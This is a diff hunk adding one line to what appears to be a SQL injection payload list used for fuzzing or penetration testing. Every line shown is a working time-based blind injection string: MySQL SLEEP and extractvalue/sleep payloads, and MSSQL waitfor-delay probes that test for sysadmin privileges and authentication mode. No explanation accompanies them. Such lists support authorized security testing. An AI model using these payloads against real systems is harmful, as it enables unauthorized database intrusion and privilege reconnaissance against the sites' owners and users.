@@ -113,3 +113,4 @@ SLEEP(1)/*' or SLEEP(1) or '" or SLEEP(1) or "*/
 '; if is_srvrolemember('sysadmin') > 0 waitfor delay '0:0:2' -- 
 '; if not((select serverproperty('isintegratedsecurityonly')) <> 1) waitfor delay '0:0:2' --
 '; if not((select serverproperty('isintegratedsecurityonly')) <> 0) waitfor delay '0:0:2' --
+' AND extractvalue(rand(),concat(0x3a,(SELECT sleep(10))))#
